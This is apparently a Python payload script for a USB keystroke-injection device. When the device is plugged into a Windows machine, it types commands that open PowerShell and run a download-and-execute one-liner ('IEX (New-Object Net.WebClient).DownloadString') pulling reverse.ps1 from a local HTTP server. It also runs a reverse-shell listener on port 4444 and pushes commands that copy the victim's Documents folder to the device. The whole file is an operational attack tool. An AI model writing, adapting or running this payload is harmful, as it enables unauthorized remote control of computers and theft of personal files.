from ecoduck import eco

import os,signal,io,http.server,socketserver,socket,time
from time import sleep
from subprocess import Popen, PIPE, check_output

from multiprocessing import Process

shellcode="""$foldername = $env:computername
$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'WINDOWS'} | %{$_.DeviceID})
$destinationFolder = "$mydrive\\$foldername"
if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
$target = [Environment]::GetFolderPath("MyDocuments")
ls $target
robocopy $target $destinationFolder /E
Write-Host "The file sync is complete." """

def recv_timeout(the_socket,timeout=1): # Receives from socket with a timeout
	the_socket.setblocking(0) # Stops socket from blocking code execution
	total_data="";data='';begin=time.time()
	while 1:
		#if you got some data, then break after wait sec
		if total_data and time.time()-begin>timeout:
			break
		#if you got no data at all, wait a little longer
		elif time.time()-begin>timeout*2:
			break
		try:
			data=the_socket.recv(4096) # recieve data
			if data:
				strdata=data.decode("utf-8") # Decode data to string
				total_data += strdata # Add to total data
				begin=time.time() # Reset timer
			else:
				time.sleep(0.1) # Sleep before checking again
		except:
			pass
	return total_data # Return all data

def reverse_shell_listener():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ;# Set is so that when we cancel out we can reuse port.
	try:
		s.bind(('', 4444)) # Bind to interface.
		print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
		s.listen(10) # Listen for only 10 unaccepted connections.
		conn, addr = s.accept() # Accept connections.
		print("[+] Connected by", addr) # Print connected by ipaddress.
		codelines=shellcode.split("\n")
		for line in codelines:
			print("Sending: " + line)
			conn.send(str(line + "\n\r").encode())
			sleep(0.5)
		print("Letting copy finish")
		sleep(5)
		print("Copy should have finished")
		s.close()
	except KeyboardInterrupt: 
		print("...listener terminated using [ctrl+c], Shutting down!")
		exit() # Using [ctrl+c] will terminate the listener.


def payload(web_dir, httpd):
	httplistener=Process(target=httpd.handle_request)
	httplistener.start()
	for i in range(5):
		eco.press("ESC")
		sleep(0.3)
	eco.press("LGUI+d")
	sleep(0.5)
	eco.press("LGUI+r")
	sleep(1)
	eco.type("powershell")
	eco.press("ENTER")
	sleep(1)
	shelllistener=Process(target=reverse_shell_listener)
	shelllistener.start()
	eco.type("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.1:8000/reverse.ps1');\"")
	eco.press("ENTER")
	print("Waiting for shell to exit")
	shelllistener.join()
	print("Shell exited")
	# Copy Documents Directory to Flash Drive
	httplistener.join(2)
	eco.type("exit")
	eco.press("ENTER")
	eco.press("LGUI+d")


# Setting up HTTP server
web_dir = os.path.abspath(os.path.join(__location__, 'http'))
os.chdir(web_dir)
httpHandler = http.server.SimpleHTTPRequestHandler
httpd = socketserver.TCPServer(('',8000),httpHandler)

print("Waiting for connection...")
while(1):
	if(eco.is_hid_connected(1)):
		print("Device connected to target")
		print("Getting OS")
		os=eco.get_os()
		if(os == "windows"):
			print("Correct OS")
			eco.set_gadget_mode(os)
			eco.wait_for_network_state(True)
			payload(web_dir, httpd)
			print("Payload execution complete")
		else:
			print("Invalid OS - payload not executing")
		print("Waiting for disconnect")
		eco.wait_for_keyboard_state(False)
		print("Disconnected!")
		eco.set_gadget_mode("simple")

